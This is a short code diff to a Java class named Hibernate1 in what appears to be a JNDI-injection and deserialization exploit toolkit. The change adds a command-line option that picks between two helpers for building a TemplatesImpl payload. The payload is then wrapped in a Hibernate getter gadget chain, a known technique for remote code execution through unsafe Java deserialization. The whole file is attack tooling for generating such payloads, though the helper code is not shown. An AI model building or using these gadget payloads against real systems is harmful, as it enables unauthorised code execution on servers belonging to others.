@@ -3,6 +3,7 @@ package com.qi4l.jndi.gadgets;
 import com.qi4l.jndi.enumtypes.PayloadType;
 import com.qi4l.jndi.gadgets.annotation.Authors;
 import com.qi4l.jndi.gadgets.utils.Gadgets;
+import com.qi4l.jndi.gadgets.utils.GadgetsYso;
 import com.qi4l.jndi.gadgets.utils.JavaVersion;
 import com.qi4l.jndi.gadgets.utils.Reflections;
 import org.hibernate.EntityMode;
@@ -19,6 +20,8 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.HashMap;
 import java.util.Map;
+
+import static com.qi4l.jndi.Starter.cmdLine;
 
 /**
  * org.hibernate.property.access.spi.GetterMethodImpl.get()
@@ -100,7 +103,12 @@ public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies{
 
 
     public Object getObject(PayloadType type, String... param) throws Exception {
-        Object tpl = Gadgets.createTemplatesImpl(type, param);
+        final Object tpl;
+        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+            tpl = GadgetsYso.createTemplatesImpl(param[0]);
+        } else {
+            tpl = Gadgets.createTemplatesImpl(type, param);
+        }
         Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
         return makeCaller(tpl, getters);
     }
